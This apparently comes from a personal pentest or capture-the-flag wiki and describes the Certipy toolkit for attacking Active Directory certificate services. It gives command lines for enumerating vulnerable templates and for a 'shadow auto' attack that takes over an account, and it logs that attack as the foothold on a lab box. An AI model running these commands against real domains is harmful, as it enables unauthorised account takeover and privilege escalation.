---
type: tool
title: Certipy
category: exploitation
tags: [ad, adcs, certificates, shadow-credentials]
updated: 2026-07-09
---

# Certipy

## What it does
Offensive ADCS (Active Directory Certificate Services) toolkit for Linux: enumerate vulnerable templates, escalate via misconfigured CAs, and forge/abuse certificates. Also bundles **shadow credential** and **account takeover** primitives.

## Common usage
```
KRB5CCNAME=/tmp/krb5cc_1000 certipy find -u <user>@<domain> -k -target <dc>   # enumerate ADCS
KRB5CCNAME=/tmp/krb5cc_1000 certipy shadow auto -u <user>@<domain> -account <target> -k -target <dc>   # shadow cred
```

## Used on
- [[absolute]] — `certipy find` confirmed ADCS present; `certipy shadow auto` forged the shadow credential on `winrm_user` for the foothold (see [[shadow-credentials]]).
